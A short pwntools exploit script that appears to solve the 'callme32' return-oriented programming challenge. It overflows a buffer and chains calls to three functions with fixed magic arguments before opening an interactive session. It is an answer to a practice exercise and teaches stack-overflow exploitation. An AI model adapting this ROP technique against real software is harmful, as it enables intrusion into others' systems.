from pwn import *

context.binary = binary = ELF('./callme32')

p = process()

padding = b'A'*0x28
ret_address = p32(0x80486ec)

rop_gadget = p32(0x080487f9)

callme1 = p32(0x080484f0)
callme2 = p32(0x08048550)
callme3 = p32(0x080484e0)

deadbeef = p32(0xdeadbeef)
cafebabe = p32(0xcafebabe)
doodfood = p32(0xd00df00d)

arguments = deadbeef + cafebabe + doodfood

payload = padding + ret_address + callme1 + rop_gadget + arguments
payload += callme2 + rop_gadget + arguments
payload += callme3 + rop_gadget + arguments

p.sendline(payload)
p.interactive()
